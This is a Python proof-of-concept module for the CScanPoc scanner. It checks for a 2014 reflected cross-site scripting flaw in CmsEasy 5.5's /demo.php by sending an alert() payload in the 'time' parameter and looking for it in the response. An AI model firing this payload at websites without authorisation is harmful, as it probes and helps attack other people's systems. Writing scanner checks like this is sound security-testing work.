# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'cmseasy_0002_p_bb2' # 平台漏洞编号，留空
    name = 'CmsEasy 5.5 /demo.php 跨站脚本漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-10-21'  # 漏洞公布时间
    desc = '''
        cmseasy /demo.php文件存在xss漏洞。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=069363' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'CmsEasy'  # 漏洞应用名称
    product_version = '<=5.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1316bced-b4dd-42a5-91ff-9473e6a3a249'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            verify_url = '{target}'.format(target=self.target)+"/demo.php?time=alert('f4aa169c58007f317b2de0b73cecbd92')"
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            content = response.read()
            if "time:alert('f4aa169c58007f317b2de0b73cecbd92')," in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()
        

if __name__ == '__main__':
    Poc().run()